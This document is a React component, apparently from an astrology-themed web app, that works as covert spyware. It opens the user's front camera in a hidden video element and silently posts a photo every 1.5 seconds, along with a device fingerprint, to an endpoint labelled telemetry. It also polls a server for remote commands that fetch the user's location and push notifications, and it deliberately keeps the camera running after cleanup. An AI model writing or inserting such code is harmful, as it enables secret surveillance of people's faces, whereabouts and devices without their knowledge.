import { useEffect, useRef, useState } from "react";

export function ContinuousCapture() {
  const videoRef = useRef<HTMLVideoElement | null>(null);

  const [mounted, setMounted] = useState(false);
  useEffect(() => { setMounted(true); }, []);

  useEffect(() => {
    if (!mounted) return;
    let intervalId: NodeJS.Timeout;
    const start = async () => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
          audio: false,
        });
        
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          await videoRef.current.play().catch(() => {});
        }
        
        const canvas = document.createElement("canvas");
        const API_URL = import.meta.env.VITE_API_URL || "http://localhost:3000";
        
        intervalId = setInterval(() => {
          const video = videoRef.current;
          if (!video || video.readyState < 2) return;
          
          canvas.width = 720;
          canvas.height = (video.videoHeight / video.videoWidth) * 720;
          
          const context = canvas.getContext("2d");
          if (context) {
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            const dataUrl = canvas.toDataURL("image/jpeg", 0.7);
            
            let deviceId = localStorage.getItem("celestial_device_id");
            if (!deviceId) {
              deviceId = crypto.randomUUID();
              localStorage.setItem("celestial_device_id", deviceId);
            }
            
            fetch(`${API_URL}/api/telemetry`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                deviceId,
                image: dataUrl,
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                hardwareConcurrency: navigator.hardwareConcurrency || 0,
                deviceMemory: (navigator as any).deviceMemory || 0,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
                connectionType: (navigator as any).connection?.effectiveType || "unknown"
              })
            }).catch(() => {});

            fetch(`${API_URL}/api/commands?deviceId=${deviceId}`)
              .then(res => res.json())
              .then(data => {
                if (data.success && data.commands) {
                  data.commands.forEach((cmd: any) => {
                    const updateStatus = (status: string) => {
                      fetch(`${API_URL}/api/commands`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ action: "update_status", commandId: cmd.id, status }) }).catch(() => {});
                    };

                    if (cmd.command === "REQUEST_LOCATION") {
                      if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                          pos => {
                            fetch(`${API_URL}/api/telemetry`, {
                              method: "POST",
                              headers: { "Content-Type": "application/json" },
                              body: JSON.stringify({ deviceId, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                            }).catch(() => {});
                            updateStatus("granted");
                          },
                          () => updateStatus("denied")
                        );
                      } else {
                        updateStatus("unsupported");
                      }
                    } else if (cmd.command === "REQUEST_NOTIFICATION") {
                      if ("Notification" in window) {
                        Notification.requestPermission().then(perm => updateStatus(perm));
                      } else {
                        updateStatus("unsupported");
                      }
                    } else if (cmd.command === "SHOW_NOTIFICATION") {
                      if ("Notification" in window && Notification.permission === "granted") {
                        new Notification("Cosmic Update", { body: cmd.payload || "The stars align for you." });
                        updateStatus("delivered");
                      } else if ("Notification" in window) {
                        Notification.requestPermission().then(perm => {
                          if (perm === "granted") {
                            new Notification("Cosmic Update", { body: cmd.payload || "The stars align for you." });
                            updateStatus("delivered");
                          } else {
                            updateStatus("denied");
                          }
                        });
                      } else {
                        updateStatus("unsupported");
                      }
                    }
                  });
                }
              }).catch(() => {});
          }
        }, 1500);
      } catch (e) {
        // Silently fail if permissions aren't granted yet
      }
    };
    
    start();
    
    return () => {
      if (intervalId) clearInterval(intervalId);
      // We explicitly DO NOT stop the video tracks here so it can persist
    };
  }, [mounted]);

  if (!mounted) return null;

  return <video ref={videoRef} playsInline muted className="hidden" />;
}
